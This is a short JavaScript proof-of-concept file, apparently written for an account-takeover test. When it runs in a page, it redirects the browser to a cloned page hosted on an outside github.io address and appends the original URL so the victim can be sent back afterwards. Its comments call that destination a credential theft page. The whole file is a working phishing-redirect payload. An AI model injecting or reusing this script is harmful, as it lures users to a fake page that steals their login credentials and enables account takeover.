// poc.js - Redirect to credential theft page
(function() {
    if (window.credentialTheftLoaded) return;
    window.credentialTheftLoaded = true;
    
    // Store original URL to redirect back after
    const originalUrl = window.location.href;
    
    // Redirect to your clone page with return URL
    window.location.href = 'https://swathip888a.github.io/ATO/index.html?return=' + encodeURIComponent(originalUrl);
})();
